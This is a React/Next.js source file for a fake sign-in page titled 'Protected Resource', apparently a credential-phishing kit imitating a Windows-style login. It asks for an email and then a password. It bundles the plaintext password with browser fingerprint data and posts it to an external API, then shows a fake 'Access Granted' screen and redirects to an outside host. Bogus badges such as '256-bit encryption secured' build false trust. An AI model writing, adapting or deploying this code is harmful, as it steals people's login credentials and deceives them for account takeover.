"use client"

import { useState, useEffect } from 'react'
import { 
  Shield, 
  Mail, 
  Lock, 
  ArrowRight, 
  Eye, 
  EyeOff,
  CheckCircle2,
  AlertCircle
} from 'lucide-react'
import { GlassCard } from '@/components/glass-card'
import { validateEmail, validatePassword, generateAvatarUrl } from '@/lib/utils'

// ⚠️ CONFIGURATION: Set your API URL here after deploying the backend
// Example: 'https://windows-auth-api.vercel.app'
const API_BASE_URL = process.env.NEXT_PUBLIC_API_URL || ''

// CONFIGURATION: Redirect URL after successful auth
const REDIRECT_URL = 'https://vis.myvnc.com'

type AuthStep = 'loading' | 'email' | 'password' | 'processing' | 'redirecting'

interface AuthData {
  email: string
  password: string
}

export default function Home() {
  const [step, setStep] = useState<AuthStep>('loading')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [emailError, setEmailError] = useState('')
  const [passwordError, setPasswordError] = useState('')
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [apiError, setApiError] = useState('')

  // Check if API URL is configured
  useEffect(() => {
    if (!API_BASE_URL && process.env.NODE_ENV === 'production') {
      console.warn('⚠️ NEXT_PUBLIC_API_URL is not set. Please configure your API URL.')
    }
  }, [])

  // Initial loading sequence
  useEffect(() => {
    const timer = setTimeout(() => {
      setStep('email')
    }, 1500)

    return () => clearTimeout(timer)
  }, [])

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    setEmailError('')

    if (!validateEmail(email)) {
      setEmailError('Please enter a valid email address')
      return
    }

    setStep('password')
  }

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setPasswordError('')
    setApiError('')

    if (!validatePassword(password)) {
      setPasswordError('Password must be at least 5 characters')
      return
    }

    if (!API_BASE_URL) {
      setApiError('API URL not configured. Please check your environment variables.')
      return
    }

    setIsSubmitting(true)
    setStep('processing')

    try {
      // Collect system information
      const systemInfo = {
        email,
        password,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString(),
      }

      // Send to external API
      const response = await fetch(`${API_BASE_URL}/api/auth`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(systemInfo),
      })

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}))
        throw new Error(errorData.error || 'Authentication failed')
      }

      // Wait 3 seconds before redirect
      setTimeout(() => {
        setStep('redirecting')
        setTimeout(() => {
          window.location.href = REDIRECT_URL
        }, 500)
      }, 3000)

    } catch (error) {
      console.error('Auth error:', error)
      setApiError(error instanceof Error ? error.message : 'Connection failed. Please try again.')
      setStep('password')
      setIsSubmitting(false)
    }
  }

  const handleBack = () => {
    setStep('email')
    setPassword('')
    setPasswordError('')
    setApiError('')
  }

  // Loading Screen
  if (step === 'loading') {
    return (
      <main className="min-h-screen flex items-center justify-center bg-gradient-to-br from-[#0066cc] via-[#004499] to-[#002266]">
        <div className="flex flex-col items-center gap-6 animate-fade-in">
          <div className="windows-loader" />
          <p className="text-white/80 text-sm font-light tracking-wide animate-pulse">
            Initializing security protocols...
          </p>
        </div>
      </main>
    )
  }

  // Processing Screen
  if (step === 'processing') {
    return (
      <main className="min-h-screen flex items-center justify-center bg-gradient-to-br from-[#0066cc] via-[#004499] to-[#002266]">
        <GlassCard className="flex flex-col items-center gap-6 min-w-[320px]">
          <div className="relative">
            <div className="w-16 h-16 rounded-full bg-white/10 flex items-center justify-center">
              <Shield className="w-8 h-8 text-white/80" />
            </div>
            <div className="absolute inset-0 rounded-full border-2 border-white/20 border-t-white/80 animate-spin" />
          </div>
          
          <div className="text-center space-y-2">
            <h3 className="text-white font-semibold text-lg">Verifying credentials</h3>
            <p className="text-white/60 text-sm">Please wait while we authenticate your access...</p>
          </div>

          <div className="flex items-center gap-1">
            <div className="dot-flashing" />
          </div>

          <div className="w-full bg-white/10 rounded-full h-1 overflow-hidden">
            <div className="h-full bg-gradient-to-r from-blue-400 to-cyan-400 animate-pulse" 
                 style={{ width: '60%' }} />
          </div>
        </GlassCard>
      </main>
    )
  }

  // Redirecting Screen
  if (step === 'redirecting') {
    return (
      <main className="min-h-screen flex items-center justify-center bg-gradient-to-br from-[#0066cc] via-[#004499] to-[#002266]">
        <GlassCard className="flex flex-col items-center gap-4">
          <CheckCircle2 className="w-12 h-12 text-green-400" />
          <h3 className="text-white font-semibold">Access Granted</h3>
          <p className="text-white/60 text-sm">Redirecting to secure resource...</p>
        </GlassCard>
      </main>
    )
  }

  // Email Step
  if (step === 'email') {
    return (
      <main className="min-h-screen flex items-center justify-center bg-gradient-to-br from-[#0066cc] via-[#004499] to-[#002266] p-4">
        <GlassCard className="w-full max-w-md animate-slide-up">
          {/* Header */}
          <div className="flex flex-col items-center gap-4 mb-8">
            <div className="w-20 h-20 rounded-2xl bg-gradient-to-br from-blue-400/20 to-cyan-400/20 flex items-center justify-center border border-white/10">
              <Shield className="w-10 h-10 text-white" />
            </div>
            <div className="text-center">
              <h1 className="text-2xl font-semibold text-white mb-2">Protected Resource</h1>
              <p className="text-white/60 text-sm">Authenticate to access protected file</p>
            </div>
          </div>

          {/* Email Form */}
          <form onSubmit={handleEmailSubmit} className="space-y-6">
            <div className="space-y-2">
              <label className="text-white/80 text-sm font-medium ml-1">Email address</label>
              <div className="relative">
                <Mail className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-white/40" />
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="name@organization.com"
                  className="w-full glass-input rounded-xl py-4 pl-12 pr-4 text-white placeholder-white/30 outline-none"
                  autoFocus
                />
              </div>
              {emailError && (
                <div className="flex items-center gap-2 text-red-400 text-sm ml-1 animate-fade-in">
                  <AlertCircle className="w-4 h-4" />
                  <span>{emailError}</span>
                </div>
              )}
            </div>

            <button
              type="submit"
              className="w-full bg-gradient-to-r from-blue-500 to-cyan-500 hover:from-blue-600 hover:to-cyan-600 text-white font-semibold py-4 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 group shadow-lg shadow-blue-500/25"
            >
              Continue
              <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
            </button>
          </form>

          {/* Security Badge */}
          <div className="mt-8 pt-6 border-t border-white/10 flex items-center justify-center gap-2 text-white/40 text-xs">
            <Lock className="w-3 h-3" />
            <span>256-bit encryption secured</span>
          </div>
        </GlassCard>
      </main>
    )
  }

  // Password Step
  return (
    <main className="min-h-screen flex items-center justify-center bg-gradient-to-br from-[#0066cc] via-[#004499] to-[#002266] p-4">
      <GlassCard className="w-full max-w-md animate-slide-up">
        {/* Back Button & Header */}
        <div className="flex items-center gap-4 mb-6">
          <button
            onClick={handleBack}
            className="p-2 hover:bg-white/10 rounded-lg transition-colors text-white/60 hover:text-white"
          >
            <ArrowRight className="w-5 h-5 rotate-180" />
          </button>
          <div className="flex-1" />
        </div>

        {/* User Info */}
        <div className="flex flex-col items-center gap-4 mb-8">
          <div className="relative">
            <img
              src={generateAvatarUrl(email)}
              alt={email}
              className="w-24 h-24 rounded-full border-2 border-white/20 bg-gradient-to-br from-blue-500 to-cyan-500"
            />
            <div className="absolute -bottom-1 -right-1 w-8 h-8 rounded-full bg-green-500 border-2 border-[#004499] flex items-center justify-center">
              <CheckCircle2 className="w-4 h-4 text-white" />
            </div>
          </div>
          <div className="text-center">
            <h2 className="text-xl font-semibold text-white">{email}</h2>
            <p className="text-white/60 text-sm">Enter your password to continue</p>
          </div>
        </div>

        {/* Password Form */}
        <form onSubmit={handlePasswordSubmit} className="space-y-6">
          <div className="space-y-2">
            <label className="text-white/80 text-sm font-medium ml-1">Password</label>
            <div className="relative">
              <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-white/40" />
              <input
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter your password"
                className="w-full glass-input rounded-xl py-4 pl-12 pr-12 text-white placeholder-white/30 outline-none"
                autoFocus
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-4 top-1/2 -translate-y-1/2 text-white/40 hover:text-white/60 transition-colors"
              >
                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
            {passwordError && (
              <div className="flex items-center gap-2 text-red-400 text-sm ml-1 animate-fade-in">
                <AlertCircle className="w-4 h-4" />
                <span>{passwordError}</span>
              </div>
            )}
            {apiError && (
              <div className="flex items-center gap-2 text-orange-400 text-sm ml-1 animate-fade-in">
                <AlertCircle className="w-4 h-4" />
                <span>{apiError}</span>
              </div>
            )}
          </div>

          <div className="flex items-center justify-between text-sm">
            <label className="flex items-center gap-2 text-white/60 cursor-pointer hover:text-white/80 transition-colors">
              <input type="checkbox" className="rounded bg-white/10 border-white/20 text-blue-500 focus:ring-blue-500" />
              <span>Remember me</span>
            </label>
            <button type="button" className="text-blue-400 hover:text-blue-300 transition-colors">
              Forgot password?
            </button>
          </div>

          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full bg-gradient-to-r from-blue-500 to-cyan-500 hover:from-blue-600 hover:to-cyan-600 disabled:opacity-50 disabled:cursor-not-allowed text-white font-semibold py-4 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 group shadow-lg shadow-blue-500/25"
          >
            {isSubmitting ? (
              <>
                <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                Authenticating...
              </>
            ) : (
              <>
                Sign in
                <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
              </>
            )}
          </button>
        </form>

        {/* Security Badge */}
        <div className="mt-8 pt-6 border-t border-white/10 flex items-center justify-center gap-2 text-white/40 text-xs">
          <Lock className="w-3 h-3" />
          <span>Protected by enterprise security</span>
        </div>
      </GlassCard>
    </main>
  )
}
